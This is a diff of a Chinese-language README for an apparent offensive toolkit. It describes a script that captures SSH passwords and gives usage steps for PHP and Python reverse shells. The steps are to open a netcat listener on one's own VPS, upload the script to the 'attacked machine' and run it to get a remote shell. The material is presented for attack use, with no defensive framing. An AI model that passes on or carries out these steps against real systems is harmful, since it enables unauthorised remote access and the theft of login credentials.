@@ -30,7 +30,7 @@ sh password.sh
 
 然后新建一个窗口ssh登录，就可以看见ssh密码
 
-# php-reverse-shell 一个基于php的反弹shell的脚本
+# php-reverse-shell.php 一个基于php的反弹shell的脚本
 
 把php-reverse-shell.php中49行的地址改为自己的公网vps
 
@@ -43,5 +43,15 @@ nc -lvp 1234
 在被攻击的机器上执行脚本，即可在vps上看到shell
 
 php php-reverse-shell.php
+
+# php-reverse-shell.py 一个基本python的反弹shell脚本
+
+在vps上监听端口，如1234
+
+nc -lvp 1234
+
+把php-reverse-shell.py上传到被攻击的机器上,指定vps地址和端口执行即可
+
+php-reverse-shell.py vps地址 1234
 
 # Hope you enjoy ^_^
